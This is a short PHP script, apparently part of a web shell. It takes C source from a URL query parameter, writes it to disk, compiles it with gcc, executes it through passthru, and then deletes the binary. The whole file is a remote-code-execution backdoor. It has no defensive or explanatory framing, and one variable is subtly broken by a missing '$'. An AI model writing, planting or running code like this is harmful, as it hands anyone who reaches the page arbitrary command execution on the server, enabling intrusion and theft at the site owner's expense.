<?php
function exe($s_c){
    $s_out = "";
    $s_c = $s_c." 2>&1";
    if(is_callable('passthru')) {
        ob_start();
        @passthru($s_c);
        $s_out = ob_get_contents();
        ob_end_clean();
    }

    return $s_out;
}

$s_code = $_GET['evalcode'];
$s_tmpdir = getcwd();

$s_script = md5(time().rand(0,100));
file_put_contents($s_script.".c", $s_code);
$s_scriptout = s_script.".exe";
$s_res = exe("gcc ".$s_script.".c -o ".$s_scriptout);
                    
$s_res = exe($s_scriptout);
rename($s_scriptout, $s_scriptout."del");
unlink($s_scriptout."del");

?>